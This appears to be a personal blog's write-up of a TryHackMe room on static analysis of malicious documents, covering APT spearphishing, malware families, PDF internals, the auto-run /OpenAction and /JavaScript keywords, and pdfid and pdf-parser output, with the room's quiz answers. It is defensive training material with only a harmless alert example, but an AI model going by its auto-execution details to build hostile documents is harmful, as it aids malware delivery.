<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> THM MalDoc: Static Analysis | NonoHM </title> <meta name="author" content="NonoHM "> <meta name="description" content="Welcome to my personnal website. I am currently a 2nd year student in the " but r et t program. i like doing sports and music besides learning new things in it.> <meta name="keywords" content="jekyll, jekyll-theme, portfolio-website, writeups, projects"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link defer href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://nonohm.github.io/blog/2024/THM-MalDoc-Static-Analysis/"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> NonoHM </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">THM MalDoc: Static Analysis</h1> <p class="post-meta"> October 13, 2024 • NonoHM </p> <p class="post-tags"> <a href="/blog/2024"> <i class="fa-solid fa-calendar fa-sm"></i> 2024 </a>   ·   <a href="/blog/tag/thm"> <i class="fa-solid fa-hashtag fa-sm"></i> THM</a>   <a href="/blog/tag/malware-analysis"> <i class="fa-solid fa-hashtag fa-sm"></i> Malware Analysis</a>   <a href="/blog/tag/re"> <i class="fa-solid fa-hashtag fa-sm"></i> RE</a>   <a href="/blog/tag/static-analysis"> <i class="fa-solid fa-hashtag fa-sm"></i> Static Analysis</a>   </p> </header> <article class="post-content"> <div id="markdown-content"> <h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>Nowadays, documents are among the most common ways to share information. They are used for various purposes like reports, proposals and contracts. Because of their prevalence, they are also a common vector of attacks and malicious actors use documents to deliver malware, steal sensitive information or carry out phishing attacks.</p> <p>Therefore, analyzing malicious documents is an essential part of any cyber security strategy. It can help identify potential threats by analyzing the document’s content and taking steps to mitigate them. This is particularly important today when more businesses rely on digital documents to share and store sensitive information.</p> <h3 id="expected-outcome">Expected Outcome</h3> <p>The expected outcome of this room is to determine if a document is malicious or not by looking at the following indicators:</p> <ul> <li>Presence of malicious URLs / Domains</li> <li>References to File Names / API Functions</li> <li>IP Addresses</li> <li>Malicious scripts like Powershell, JavaScript, VBScript…</li> </ul> <p>In this room, we will understand the different variants of malicious documents, their structure and how they are used in different phishing attacks. We will then explore the tools and concepts required to analyze a document.</p> <h3 id="learning-objectives">Learning Objectives</h3> <p>In this room, we will cover:</p> <ul> <li>Different documents like OneNote, docm, docx, xls…</li> <li>Analyze complex Javascript</li> <li>Importance of Malicious Document Analysis</li> <li>PDF Structure and key components like objects, keywords and filtering</li> </ul> <h2 id="task-3---initial-access---spearphishing-attachment">Task 3 - Initial Access - Spearphishing Attachment</h2> <p>Malicious documents are one of the primary ways to get initial access to a system or a network. Many <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/threat-intelligence/advanced-persistent-threat-apt/" rel="external nofollow noopener" target="_blank">APT</a> (Advanced Persistent Threat) groups have found utilizing spearphishing attachments as their <em>Initial Access Technique</em>.</p> <h3 id="spearphishing-attachment">Spearphishing Attachment</h3> <p><a href="https://attack.mitre.org/techniques/T1566/001/" rel="external nofollow noopener" target="_blank">Spearphishing attachments</a> are very common cyberattacks targeting specific individuals or organizations through carefully crafted and personalized phishing emails. The attacker aims to trick the recipient into opening a malicious attachment, typically containing an harmful payload. By doing so, he gains unauthorized access to the target’s system, allowing the stealing of sensitive information and more.</p> <p>Advanced Persistent Threats (APT) are highly organized cybercrime groups or state-sponsored entities known to use spearphishing attacks to infiltrate their targets’ systems. Here are a few examples of APT groups that have used spearphishing attachments in their attacks:</p> <ul> <li> <strong>APT28 (Fancy Bear):</strong> This Russian state-sponsored group has been responsible for various high-profile cyberattacks, such as the 2016 Democratic National Committee (DNC) hack. APT28 used spearphishing emails with malicious attachments disguised as legitimate files to trick recipients into opening them. Once opened, the malware installed on the victims’ computers allowed the attackers to exfiltrate sensitive information.</li> <li> <strong>APT34 (OilRig):</strong> APT34 is an Iranian cyber espionage group that has targeted various industries, primarily focusing on the Middle East. One of their tactics includes spearphishing emails with malicious Microsoft Excel attachments. When victims open the attachment, a macro initiates the download and installation of malware, which then establishes a connection with the attackers’ command and control servers.</li> <li> <strong>APT29 (Cozy Bear):</strong> Another Russian state-sponsored group, APT29, has targeted governments and organizations worldwide. In a high-profile attack against the Norwegian Parliament in 2020, APT29 sent spearphishing emails with malicious attachments to parliament members. The attack resulted in unauthorized access to sensitive data.</li> <li> <strong>APT10 (MenuPass Group):</strong> A Chinese cyber espionage group, APT10 has targeted organizations in various sectors, including government, aerospace, and healthcare. They have used spearphishing emails with malicious attachments that appear to be legitimate documents, such as job offers or invoices. When the attachment is opened, the malware contained within it compromises the target’s system, allowing APT10 to exfiltrate sensitive data.</li> </ul> <h3 id="associated-malware-families">Associated Malware Families</h3> <p>Some of the malware families that are spreading through malicious documents are:</p> <ul> <li> <strong>Emotet:</strong> Banking trojan that is often distributed through malicious email attachments, typically in the form of Microsoft Word documents. Once installed, Emotet can steal sensitive information, such as banking credentials and email addresses, and it can also be used to download additional malware. MITRE reference available <a href="https://attack.mitre.org/software/S0367/." rel="external nofollow noopener" target="_blank">here</a>.</li> <li> <strong>Trickbot:</strong> Banking trojan that is often distributed through malicious email attachments and is known for its modular design, which allows attackers to add new functionality to the malware as needed. Trickbot has been used to deliver ransomware, exfiltrate data, and perform other types of malicious activity. MITRE reference available <a href="https://attack.mitre.org/software/S0383/" rel="external nofollow noopener" target="_blank">here</a>.</li> <li> <strong>QBot:</strong> Banking trojan that is often distributed through malicious email attachments and is known for its ability to steal banking credentials and other sensitive information. QBot is also capable of downloading and executing additional malware and can be used to create backdoors on infected systems. MITRE reference available <a href="https://attack.mitre.org/software/S0385/" rel="external nofollow noopener" target="_blank">here</a>.</li> <li> <strong>Dridex:</strong> Banking trojan that is often distributed through malicious email attachments and is known for its ability to steal banking credentials and other sensitive information. Dridex has been active since 2014 and has been one of the most prevalent banking trojans in recent years. MITRE reference available <a href="https://attack.mitre.org/software/S0384/" rel="external nofollow noopener" target="_blank">here</a>.</li> <li> <strong>Locky:</strong> Ransomware family that is often spread through malicious email attachments, typically in the form of Microsoft Word documents. Once installed, Locky encrypts the victim’s files and demands a ransom payment in exchange for the decryption key. MITRE reference available <a href="https://attack.mitre.org/software/S0369/" rel="external nofollow noopener" target="_blank">here</a>.</li> <li> <strong>Zeus:</strong> Banking trojan that has been active since 2007 and is often distributed through malicious email attachments. Zeus is known for its ability to steal banking credentials and other sensitive information and has been used in numerous high-profile attacks over the years. MITRE reference available <a href="https://attack.mitre.org/software/S0382/" rel="external nofollow noopener" target="_blank">here</a>.</li> <li> <strong>Petya:</strong> Ransomware family that is often spread through malicious email attachments and has been active since 2016. Petya is known for its ability to encrypt the victim’s entire hard drive, making it much more difficult to recover from than other types of ransomware. MITRE reference available <a href="https://attack.mitre.org/software/S0367/" rel="external nofollow noopener" target="_blank">here</a>.</li> </ul> <h3 id="questions">Questions</h3> <p><strong>From which family does the Locky malware belong to?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Ransomware</code></em></p> <p><strong>What is the Sub-technique ID assigned to Spearphishing Attachment?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">T1566.001</code></em></p> <h2 id="task-4---documents-and-their-malicious-use">Task 4 - Documents and their malicious use</h2> <p>Attackers can abuse different type of digital documents and readers security flaws to execute code on a user’s system. That is why it is important to be cautious when opening documents from unknown sources and to keep software / security measures up to date to reduce the risk of falling victim of these attacks.</p> <h3 id="pdf">PDF</h3> <p>Portable Document Format (PDF) is a widely used document format that can be opened on different devices. PDF files can be exploited by attackers to deliver malware or launch attacks through techniques like embedding malicious JavaScript, exploiting vulnerabilities in PDF readers, including phishing links, hiding malicious attachments, or using social engineering tactics. These methods can lead to malware downloads, system compromise, or credential theft. To stay safe, users should keep PDF software updated, disable JavaScript, avoid opening suspicious PDFs, and use security tools to scan files.</p> <h3 id="docm">DOCM</h3> <p>Microsoft Word documents can be used to deliver malware by using macros, which are a series of commands that automate tasks within a document. Unlike <em>.docm</em> files, <em>.docx</em> should not contain any macros and are deleted when the file is being saved. With recent versions of Word, the <em>.docm</em> file renamed <em>.docx</em> will not open and will appear corrupted because word treat differently the file by considering their extension. In completion, <em>.doc</em> files for Word 97-2003 are not structured like <em>.docx</em> and variants, hence they can embed macros and don’t give as much protection as <em>.docx</em> files. Attackers create malicious DOCM files that prompt users to enable macros to view the content, which, once activated, can execute harmful code to steal data or install malware. To mitigate this risk, users should avoid enabling macros from untrusted documents and scan files for threats.</p> <h3 id="xlsmpptm">XLSM/PPTM…</h3> <p>Excel spreadsheets and Powerpoint can be used as the same way as Word documents using macros.</p> <h3 id="xml">XML</h3> <p>Extensible Markup Language (XML) is a markup language used to store and transport data. Attackers can use XML documents to exploit vulnerabilities in a user’s system. For example, attackers can inject malicious code into an application by uploading an XML file that contains code designed to exploit vulnerabilities in the application software.</p> <h3 id="onenote">OneNote</h3> <p>OneNote is a digital note-taking application that allows users to organize and share their notes across devices. While OneNote itself is not typically used to deliver malicious content, it can be abused to deliver phishing attacks by containing rogue links or via embeded objects. Unlike Word, Excel and Powerpoint, it is not directly possible to use VBA macros with <em>.one</em> files.</p> <h2 id="task-5---pdf-documents---structure">Task 5 - PDF Documents - Structure</h2> <p>Before starting analyzing PDF Documents, we must understand its structure and what are the components that can be found within one.</p> <p>A PDF file consists of a series of objects that are organized into a specific structure. The following is a brief overview of a PDF file structure:</p> <ul> <li> <strong>PDF Header:</strong> The header is the first line in a PDF file, containing a file signature and a version number. The <em>file signature</em> is a sequence of characters that identifies the file as PDF, which is <code class="language-plaintext highlighter-rouge">%PDF-x.x</code>. The version number indicates the version of the PDF specification used to create the document.</li> </ul> <pre><code class="language-pdf">%PDF-1.7 // Example of a PDF Header
</code></pre> <ul> <li> <strong>PDF Body:</strong> The body contains a series of objects that are organized in a specific structure. Each object is identified by an object number and generation number, which are used to uniquely identify the object within the document.</li> </ul> <pre><code class="language-pdf">1 0 obj
&lt;&lt; /Type /Catalog
   /Pages 2 0 R
&gt;&gt;
endobj
2 0 obj
&lt;&lt; /Type /Pages
   /Kids [3 0 R 4 0 R]
   /Count 2
&gt;&gt;
endobj
3 0 obj
&lt;&lt; /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Contents 5 0 R
&gt;&gt;
endobj
4 0 obj
&lt;&lt; /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Contents 6 0 R
&gt;&gt;
endobj
</code></pre> <p>Below is a detailed summary of different object types available in PDF standards:</p> <table> <thead> <tr> <th><strong>Object Type</strong></th> <th><strong>Description</strong></th> <th><strong>Example</strong></th> <th><strong>Explanation</strong></th> </tr> </thead> <tbody> <tr> <td><strong>Text Object</strong></td> <td>Represents text content with formatting and positioning.</td> <td><code class="language-plaintext highlighter-rouge">plaintext BT /F1 12 Tf 100 700 Td (Hello, World!) Tj ET</code></td> <td>- <code class="language-plaintext highlighter-rouge">BT</code>: Begin text block. <br> - <code class="language-plaintext highlighter-rouge">/F1 12 Tf</code>: Set font to <code class="language-plaintext highlighter-rouge">/F1</code> with size <code class="language-plaintext highlighter-rouge">12</code>. <br> - <code class="language-plaintext highlighter-rouge">Td</code>: Move to (100, 700). <br> - <code class="language-plaintext highlighter-rouge">Tj</code>: Show text “Hello, World!”. <br> - <code class="language-plaintext highlighter-rouge">ET</code>: End text block.</td> </tr> <tr> <td><strong>Image Object</strong></td> <td>Holds images with their attributes.</td> <td><code class="language-plaintext highlighter-rouge">plaintext &lt;&lt; /Type /XObject /Subtype /Image /Width 300 /Height 200 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /DCTDecode /Length 12345 &gt;&gt; stream &lt;binary image data here&gt; endstream</code></td> <td>- <code class="language-plaintext highlighter-rouge">/Type /XObject</code>: Indicates it’s an external object. <br> - <code class="language-plaintext highlighter-rouge">/Subtype /Image</code>: Specifies it’s an image. <br> - <code class="language-plaintext highlighter-rouge">/Width</code> &amp; <code class="language-plaintext highlighter-rouge">/Height</code>: Set dimensions. <br> - <code class="language-plaintext highlighter-rouge">/Filter /DCTDecode</code>: JPEG compression.</td> </tr> <tr> <td><strong>Graphic Object</strong></td> <td>Defines shapes, lines, and colors.</td> <td><code class="language-plaintext highlighter-rouge">plaintext 0.5 0.5 0.5 RG 100 600 200 100 re f</code></td> <td>- <code class="language-plaintext highlighter-rouge">0.5 0.5 0.5 RG</code>: Set fill color to grey (RGB). <br> - <code class="language-plaintext highlighter-rouge">re</code>: Create a rectangle at (100, 600) with width 200 and height 100. <br> - <code class="language-plaintext highlighter-rouge">f</code>: Fill the rectangle.</td> </tr> <tr> <td><strong>Form Object</strong></td> <td>Allows for interactive elements like text fields.</td> <td><code class="language-plaintext highlighter-rouge">plaintext &lt;&lt; /Type /Annot /Subtype /Widget /Rect [100 500 200 550] /FT /Tx /T (TextField1) /V (Default Text) /F 4 /MK &lt;&lt; /BC [0 0 1] /BG [1 1 1] &gt;&gt; &gt;&gt;</code></td> <td>- <code class="language-plaintext highlighter-rouge">/Type /Annot</code>: Annotation object. <br> - <code class="language-plaintext highlighter-rouge">/Subtype /Widget</code>: Indicates an interactive element. <br> - <code class="language-plaintext highlighter-rouge">/Rect</code>: Define the field’s rectangle area. <br> - <code class="language-plaintext highlighter-rouge">/FT /Tx</code>: Text field type.</td> </tr> <tr> <td><strong>Content Stream</strong></td> <td>Sequence of instructions for rendering the page.</td> <td><code class="language-plaintext highlighter-rouge">plaintext 1 0 0 1 0 0 cm BT /F1 24 Tf 100 700 Td (Welcome to the PDF!) Tj ET 0 0 0 RG 50 50 200 100 re f</code></td> <td>- <code class="language-plaintext highlighter-rouge">1 0 0 1 0 0 cm</code>: Transformation matrix. <br> - <code class="language-plaintext highlighter-rouge">BT</code> &amp; <code class="language-plaintext highlighter-rouge">ET</code>: Begin and end text block. <br> - <code class="language-plaintext highlighter-rouge">Td</code>: Move to position. <br> - <code class="language-plaintext highlighter-rouge">RG</code>: Set fill color to black. <br> - <code class="language-plaintext highlighter-rouge">re</code> and <code class="language-plaintext highlighter-rouge">f</code>: Create and fill a rectangle.</td> </tr> <tr> <td><strong>Font Object</strong></td> <td>Defines font properties used for text.</td> <td><code class="language-plaintext highlighter-rouge">plaintext &lt;&lt; /Type /Font /Subtype /Type1 /BaseFont /Helvetica &gt;&gt;</code></td> <td>- <code class="language-plaintext highlighter-rouge">/Type /Font</code>: Object type is a font. <br> - <code class="language-plaintext highlighter-rouge">/Subtype /Type1</code>: Specifies the font type. <br> - <code class="language-plaintext highlighter-rouge">/BaseFont /Helvetica</code>: Name of the font.</td> </tr> </tbody> </table> <ul> <li> <strong>PDF Cross-Reference Table:</strong> The cross-reference table is a table that provides a map of the locations of all the objects in the PDF file. It is made to quickly locate objects within the file and it is used by reader software. It allows the PDF reader to jump to the object without needing to scan the whole document, which makes viewing large PDF faster. This is not to be mistaken for <em>Outlines/Bookmarks</em>, which are made for user to navigate fluently through the PDF.</li> </ul> <p>The table consists of a <strong>starting header</strong> <code class="language-plaintext highlighter-rouge">xref</code> and the numbers <code class="language-plaintext highlighter-rouge">x y</code>, which <em>x</em> is the <strong>first object number</strong> in the PDF (usually <em>0</em>) and <em>y</em> is the <strong>amount of objects</strong> present in the file. Then, the table of objects starts and each row is composed of a 10-digit number <code class="language-plaintext highlighter-rouge">XXXXXXXXXX</code>, which is the <strong>object offset compared to the beginning of the file</strong>. Moreover, there is a 5-digit number <code class="language-plaintext highlighter-rouge">YYYYY</code>, which increments as the object is modified through an editor. Also, there is a character <code class="language-plaintext highlighter-rouge">f</code> for free object, which is unused in the file and char <code class="language-plaintext highlighter-rouge">n</code> for an in-use object. These two types exists in order to not change every reference every time an object has been modified. We must note that the first object in a pdf, <code class="language-plaintext highlighter-rouge">object 0</code> is always a free object with the reserved generation number <code class="language-plaintext highlighter-rouge">65535</code>, serving as a placeholder.</p> <table> <thead> <tr> <th><strong>Section</strong></th> <th><strong>Description</strong></th> <th><strong>Example</strong></th> </tr> </thead> <tbody> <tr> <td><strong>Starting Header</strong></td> <td>The keyword that starts the xref table.</td> <td><code class="language-plaintext highlighter-rouge">xref</code></td> </tr> <tr> <td><strong>x y (Subsection Info)</strong></td> <td>Indicates the first object number (<strong>x</strong>) and the number of objects (<strong>y</strong>) in the subsection.</td> <td> <code class="language-plaintext highlighter-rouge">0 5</code> (Starts at object 0, 5 objects total)</td> </tr> <tr> <td><strong>XXXXXXXXXX (Offset)</strong></td> <td>A 10-digit number representing the <strong>byte offset</strong> of the object from the beginning of the file.</td> <td> <code class="language-plaintext highlighter-rouge">0000000150</code> (Object at byte 150)</td> </tr> <tr> <td><strong>YYYYY (Generation)</strong></td> <td>A 5-digit number representing the <strong>generation number</strong> of the object.</td> <td> <code class="language-plaintext highlighter-rouge">00000</code> (Original generation)</td> </tr> <tr> <td><strong>n (Normal Object)</strong></td> <td>Indicates the object is <strong>in use</strong> in the PDF file.</td> <td><code class="language-plaintext highlighter-rouge">0000000150 00000 n</code></td> </tr> <tr> <td><strong>f (Free Object)</strong></td> <td>Indicates the object is <strong>free</strong>, meaning it is deleted or unused but kept for reuse.</td> <td><code class="language-plaintext highlighter-rouge">0000000000 65535 f</code></td> </tr> <tr> <td><strong>Object 0</strong></td> <td>The first object in a PDF file, always a <strong>free object</strong> with generation number <code class="language-plaintext highlighter-rouge">65535</code>.</td> <td><code class="language-plaintext highlighter-rouge">0000000000 65535 f</code></td> </tr> </tbody> </table> <pre><code class="language-pdf">xref
0 5
0000000000 65535 f    % Object 0: Always free
0000000010 00000 n    % Object 1: In use, at byte 10
0000000150 00000 n    % Object 2: In use, at byte 150
0000000200 00001 f    % Object 3: Free, generation 1, which was in-use before and now has been deleted
0000000300 00000 n    % Object 4: In use, at byte 300
</code></pre> <ul> <li> <strong>PDF Trailer:</strong> The trailer is the last section in a PDF file and provides information about the document, such as the cross-reference table location, file metadata and any encryption or security settings.</li> </ul> <table> <thead> <tr> <th><strong>Section</strong></th> <th><strong>Description</strong></th> <th><strong>Example</strong></th> </tr> </thead> <tbody> <tr> <td><strong>Starting Keyword</strong></td> <td>The keyword that begins the trailer section.</td> <td><code class="language-plaintext highlighter-rouge">trailer</code></td> </tr> <tr> <td><strong>Trailer Dictionary</strong></td> <td>A dictionary containing key-value pairs that provide essential information about the PDF file.</td> <td><code class="language-plaintext highlighter-rouge">&lt;&lt; ... &gt;&gt;</code></td> </tr> <tr> <td><strong><code class="language-plaintext highlighter-rouge">/Size</code></strong></td> <td>Indicates the total number of objects in the cross-reference table.</td> <td><code class="language-plaintext highlighter-rouge">/Size 6</code></td> </tr> <tr> <td><strong><code class="language-plaintext highlighter-rouge">/Root</code></strong></td> <td>Reference to the <strong>root object</strong> (catalog) of the PDF, defining the document’s structure.</td> <td><code class="language-plaintext highlighter-rouge">/Root 1 0 R</code></td> </tr> <tr> <td><strong><code class="language-plaintext highlighter-rouge">/Info</code></strong></td> <td>Reference to the <strong>document information dictionary</strong> containing metadata (like title, author, etc.).</td> <td><code class="language-plaintext highlighter-rouge">/Info 2 0 R</code></td> </tr> <tr> <td><strong><code class="language-plaintext highlighter-rouge">/ID</code></strong></td> <td>The <strong>file identifier</strong>, which is a unique ID for the PDF file, consisting of two parts (original and modified IDs).</td> <td><code class="language-plaintext highlighter-rouge">/ID [&lt;e382f6...&gt; &lt;e382f6...&gt;]</code></td> </tr> <tr> <td> <strong><code class="language-plaintext highlighter-rouge">/Prev</code></strong> (Optional)</td> <td>Points to the byte offset of the <strong>previous cross-reference table</strong> for incremental updates.</td> <td><code class="language-plaintext highlighter-rouge">/Prev 1234</code></td> </tr> <tr> <td><strong><code class="language-plaintext highlighter-rouge">startxref</code></strong></td> <td>Indicates the <strong>byte offset</strong> where the cross-reference table begins in the PDF file.</td> <td><code class="language-plaintext highlighter-rouge">startxref 456</code></td> </tr> <tr> <td><strong><code class="language-plaintext highlighter-rouge">%%EOF</code></strong></td> <td>Marks the <strong>end of the file</strong>.</td> <td><code class="language-plaintext highlighter-rouge">%%EOF</code></td> </tr> </tbody> </table> <pre><code class="language-pdf">trailer
&lt;&lt;
  /Size 6
  /Root 1 0 R
  /Info 2 0 R
  /ID [&lt;e382f6...&gt; &lt;e382f6...&gt;]
  /Prev 1234
&gt;&gt;
startxref
456
%%EOF
</code></pre> <p>Now we have explored the different sections of the PDF file format, we will see some important keywords with a focused usage in maldocs:</p> <table> <thead> <tr> <th>PDF Keyword</th> <th>Actions</th> </tr> </thead> <tbody> <tr> <td>/JavaScript</td> <td>Specifies that JavaScript code will be executed.</td> </tr> <tr> <td>/JS</td> <td>Contains the actual JavaScript code to be executed, for example, <code class="language-plaintext highlighter-rouge">(app.alert("Hello, World!"))</code>, which displays an alert box with the message “Hello, World!”.</td> </tr> <tr> <td>/Names</td> <td>Lists file names or other references used within the PDF document.</td> </tr> <tr> <td>/OpenAction</td> <td>Defines an action that will automatically execute when the PDF is opened. Located in the document catalog (the root of the PDF), it can run JavaScript, navigate to a page, etc.</td> </tr> <tr> <td>/AA (Additional Action)</td> <td>Specifies additional actions linked to document events or interactive elements, such as running a script when a user performs a specific action.</td> </tr> <tr> <td>/EmbeddedFile</td> <td>Refers to files embedded within the PDF, like scripts or other attachments, which can be accessed or executed.</td> </tr> <tr> <td>/URI</td> <td>Contains links to external URLs, allowing the PDF to link to websites or online resources.</td> </tr> <tr> <td>/SubmitForm</td> <td>Defines an action to submit form data within the PDF, typically to a specified URL or email address.</td> </tr> <tr> <td>/Launch</td> <td>Runs embedded scripts or launches other files within the PDF, sometimes referencing external files that the PDF may download or open.</td> </tr> </tbody> </table> <p>For knowledge, a JavaScipt object is defined like below:</p> <pre><code class="language-pdf">4 0 obj
&lt;&lt;
  /Type /Action
  /S /JavaScript
  /JS (app.alert("Hello, World!"))
&gt;&gt;
endobj
</code></pre> <ul> <li> <strong><code class="language-plaintext highlighter-rouge">4 0 obj</code></strong>: This is the identifier for the object. In this case, it is <strong>object 4</strong>, generation <strong>0</strong>.</li> <li> <strong><code class="language-plaintext highlighter-rouge">/Type /Action</code></strong>: This tells the PDF reader that the object is an <strong>action</strong>.</li> <li> <strong><code class="language-plaintext highlighter-rouge">/S /JavaScript</code></strong>: The <strong><code class="language-plaintext highlighter-rouge">/S</code></strong> key defines the <strong>subtype of the action</strong>, which in this case is <strong>JavaScript</strong> (<code class="language-plaintext highlighter-rouge">/S /JavaScript</code> means this action will execute JavaScript code).</li> <li> <strong><code class="language-plaintext highlighter-rouge">/JS (app.alert("Hello, World!"))</code></strong>: This is the actual <strong>JavaScript code</strong> to be executed. Here, it shows an alert dialog box that says <strong>“Hello, World!”</strong> when triggered.</li> <li> <strong><code class="language-plaintext highlighter-rouge">endobj</code></strong>: This marks the end of the object.</li> </ul> <p>In order to trigger it, here <code class="language-plaintext highlighter-rouge">/OpenAction</code> flag is used. <code class="language-plaintext highlighter-rouge">/OpenAction</code> entry is located in the document catalog (the root object of the PDF). It defines an action that is automatically triggered when the document is opened, such as running JavaScript, navigating to a specific page, or zooming to a certain view.</p> <pre><code class="language-pdf">1 0 obj
&lt;&lt;
  /Type /Catalog
  /Pages 2 0 R
  /OpenAction 4 0 R
&gt;&gt;
endobj
</code></pre> <ul> <li> <strong><code class="language-plaintext highlighter-rouge">/OpenAction 4 0 R</code>:</strong> Indictates to trigger the object <strong>4</strong>, generation <strong>0</strong>. The <strong>R</strong> keyword indicates that an <em>indirect reference</em> to another object is being made.</li> </ul> <h3 id="analyzing-a-simplepdf-document">Analyzing a simple.pdf document</h3> <p>Within the provided lab, we have a PDF file called <code class="language-plaintext highlighter-rouge">simple.pdf</code>. By using <em>notepad</em>, it is able to recognize the PDF structure and components:</p> <figure> <picture> <img src="/assets/img/images/thm_maldoc_static_analysis/By53snY1yg.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="notepad simple.pdf" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <h3 id="question">Question</h3> <p><strong>Who is the author of the simple.pdf document?</strong></p> <p>The author’s name is available in the 7th object.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Ben</code></em></p> <h2 id="task-6---analyzing-a-pdf-document">Task 6 - Analyzing a PDF Document</h2> <p>When opening <code class="language-plaintext highlighter-rouge">simple.pdf</code> using notepad, we can get at first sight:</p> <ul> <li>PDF Version</li> <li>Author name</li> <li>Objects</li> <li>Keywords like <em>JavaScript</em>, <em>Action</em>…</li> <li>Trailer</li> </ul> <p>Similar information can be obtained using the <code class="language-plaintext highlighter-rouge">strings</code> command.</p> <h3 id="tools">Tools</h3> <h4 id="pdfidpy">pdfid.py</h4> <p><code class="language-plaintext highlighter-rouge">pdfid.py</code> is a tool to summarize the objects/keywords found in a PDF. We will try it using <code class="language-plaintext highlighter-rouge">pdfid.py simple.pdf</code>:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/Desktop<span class="nv">$ </span>pdfid.py simple.pdf 
PDFiD 0.2.5 simple.pdf
 PDF Header: %PDF-1.7
 obj                   18    //1
 endobj                18
 stream                 3    //2
 endstream              3
 xref                   1
 trailer                1
 startxref              1
 /Page                  1
 /Encrypt               0
 /ObjStm                0
 /JS                    1    //3
 /JavaScript            1
 /AA                    0
 /OpenAction            1    //4
 /AcroForm              0
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          0
 /XFA                   0
 /Colors <span class="o">&gt;</span> 2^24         0
</code></pre></div></div> <ol> <li> <strong>Objects:</strong> This document contains 18 objects.</li> <li> <strong>Streams:</strong> This document contains 3 streams (image, code, description…) that we might examine.</li> <li> <strong>JS / Javascript:</strong> This document contains 1 Javascript and 1 JS instance.</li> <li> <strong>OpenAction:</strong> Indicates an action will be performed when the document will be opened.</li> </ol> <h4 id="pdf-parserpy">pdf-parser.py</h4> <p><code class="language-plaintext highlighter-rouge">pdf-parser.py</code> is very handy tool used to parse, search for objects, filter and more…</p> <p>Its usage is the following:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pdf-parser.py <span class="o">[</span>option] file|zip|url
</code></pre></div></div> <p>We can get the <code class="language-plaintext highlighter-rouge">/OpenAction</code> keyword by using the <code class="language-plaintext highlighter-rouge">--search</code> option.</p> <pre><code class="language-pdf">remnux@thm-remnux:~/Desktop$ pdf-parser.py --search OpenAction simple.pdf 
obj 1 0
 Type: /Catalog
 Referencing: 2 0 R, 3 0 R, 4 0 R, 5 0 R, 6 0 R

  &lt;&lt;
    /Type /Catalog
    /Pages 2 0 R
    /Lang (en-GB)
    /StructTreeRoot 3 0 R
    /MarkInfo
      &lt;&lt;
        /Marked true
      &gt;&gt;
    /Metadata 4 0 R
    /ViewerPreferences 5 0 R
    /OpenAction 6 0 R
  &gt;&gt;
